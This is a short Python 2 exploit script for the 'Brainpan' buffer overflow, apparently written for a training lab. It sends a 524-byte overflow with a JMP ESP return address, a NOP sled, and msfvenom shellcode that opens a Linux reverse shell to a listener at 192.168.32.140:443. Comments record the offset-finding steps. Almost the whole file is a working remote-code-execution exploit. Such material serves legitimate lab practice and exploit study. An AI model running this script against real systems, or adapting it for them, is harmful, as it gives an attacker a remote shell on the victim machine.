#!/usr/bin/python

# Brainpan Bufferoverflow
#
# JMcPeters 3/2/19

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


target = raw_input("Please enter target IP address: ")

#msfvenom -p linux/x86/shell_reverse_tcp -b '\x00' EXITFUNC=thread LHOST=192.168.32.140 LPORT=443 -f python

buf =  ""
buf += "\xda\xd7\xbf\xd4\xac\xbc\xf6\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x12\x83\xc0\x04\x31\x78\x13\x03\xac\xbf\x5e"
buf += "\x03\x7d\x1b\x69\x0f\x2e\xd8\xc5\xba\xd2\x57\x08\x8a"
buf += "\xb4\xaa\x4b\x78\x61\x85\x73\xb2\x11\xac\xf2\xb5\x79"
buf += "\xef\xad\x66\xf5\x87\xaf\x66\x04\xe3\x39\x87\xb6\x75"
buf += "\x6a\x19\xe5\xca\x89\x10\xe8\xe0\x0e\x70\x82\x94\x21"
buf += "\x06\x3a\x01\x11\xc7\xd8\xb8\xe4\xf4\x4e\x68\x7e\x1b"
buf += "\xde\x85\x4d\x5c"


#crash at 900

#EIP 35724134

#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
#[*] Exact match at offset 524

#311712F3   FFE4             JMP ESP

# buffer = "A" * 524 + "B" * 4 + "C" * 90

# buffer = "A" * 524 + "\xf3\x12\x17\x31" + "C" * 90

buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16 + buf

try:
	print "\n[*] Sending buffer..."
	connect = s.connect((target, 9999))
	data = s.recv(1024)
	s.send(buffer + "\r\n")
	print "\nDone!"

except:
	print "[!] Could not connect to server!"
